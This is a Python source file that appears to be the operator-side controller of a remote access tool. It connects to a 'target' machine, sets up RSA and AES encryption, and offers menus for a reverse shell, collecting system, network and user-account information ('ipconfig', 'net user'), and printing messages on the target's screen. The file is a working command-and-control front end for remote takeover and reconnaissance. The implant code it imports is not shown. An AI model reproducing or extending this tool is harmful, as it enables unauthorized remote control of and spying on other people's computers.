from Objet_Us_Target import Client
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("-p", "--print_target", action="store_true", help="Show on Target's screen what are doing")
parser.add_argument("-ip", "--ip_target", default="127.0.0.1", type=str,
                    help="define de target's ip, Default is 127.0.0.1 (localhost)")
parser.add_argument("-s", "--shell", action="store_true", help="Skip main menu and go directly to the Shell prompt")
parser.add_argument("-i", "--get_info", action="store_true", help="Skip main menu and go directly to the \"get info\" "
                                                                  "menu")
parser.add_argument("-b", "--buffer_size", type=int, default="4096", choices=[2048, 4096, 8192, 16384],
                    help="Set the buffer size. Default is 4096.")
args = parser.parse_args()


def menu():
    while client.connection_active:
        print("\t\t============\n\t\t\tMENU\n\t\t============")
        print("Welcome, what's your choice?\n1. Reverse Shell \n2. Get info \n3. Settings\n4. Quit")
        choice = input("> ")

        if choice == "1" or choice == "shell" or choice == "Shell":
            client.reverse_shell_send_command()
        if choice == "2" or choice == "get info" or choice == "Get info":
            menu_getinfo()
        if choice == "3" or choice == "settings" or choice == "Settings":
            menu_settings()
        if choice == "4" or choice == "quit" or choice == "Quit":
            break


def menu_getinfo():
    print("\t\t============\n\t\t\tMENU\n\t\t  Get Info\n\t\t============")
    print("1. Global information\n2. Network information\n3. list user\n4. Quit")
    choice = input("> ")

    if choice == "1":
        client.getinfo("getinfo_generality")
    if choice == "2":
        client.getinfo("ipconfig")
    if choice == "3":
        client.getinfo("net user")


def menu_settings():
    print("\t\t============\n\t\t\tMENU\n\tSettings\n\t\t============")
    print("Settings: ")
    print("1. Print on target's screen\n"
          "2. Target's buffer size\n"
          "3. Quit \n")
    choice = input("> ")

    if choice == "1":
        menu_print_on_target()
    if choice == "2":
        menu_buffer()


def menu_print_on_target():
    print("\t\t============\n\t\t\tMENU\n\tPrint on Target Screen\n\t\t============")
    print("1. Print on Target screen")
    print("2. I DON'T want to")
    print("3. Don't change and go back")
    choice = input(">")

    if choice == "1":
        client.print_target(True)
    if choice == "2":
        client.print_target(False)


def menu_buffer():
    print("which size would you want: ")
    print("1. 2048\n2. 4096\n3. 8192\n4. 16384\n5. What's buffer size ?\n6. quit")
    size_buffer = input("> ")
    if size_buffer == "1":
        client.buffer = 2048
        client.set_target_buffer(2048)
    if size_buffer == "2":
        client.buffer = 4096
        client.set_target_buffer(4096)
    if size_buffer == "3":
        client.buffer = 8192
        client.set_target_buffer(8192)
    if size_buffer == "4":
        client.buffer = 16384
        client.set_target_buffer(16384)
    if size_buffer == "5":
        print("EN: In computing, a data buffer (or simply a buffer) is a region of a physical memory used to "
              "temporarily store data while it is being processed as when moved from one location to another.")
        print("FR: En informatique, un tampon de données (ou tout simplement un tampon) est une région d’une mémoire "
              "physique utilisée pour stocker temporairement des données le temps qu'elles soient traitées comme "
              "lorsqu’elles sont déplacées d’un endroit à un autre.")
        print("\nSource: https://en.wikipedia.org/wiki/Data_buffer\n")
        menu_buffer()


client = Client(args.ip_target)
client.buffer = args.buffer_size
try:
    client.connect_to_server()
    print("generating RSA key. this step can take some time")
    client.key_generate_rsa()
    print("receiving AES key")
    client.recv_key_aes()
    print("your connection with the target is now encrypted and safe.")
    if args.print_target:
        client.print_target(True)
    if args.shell:
        client.reverse_shell_send_command()
    if args.get_info:
        menu_getinfo()
    menu()
    if client.connection_active:
        client.quit()
except ConnectionRefusedError as msg:
    print("Error: " + str(msg))
    print("The programme on target is not running.")


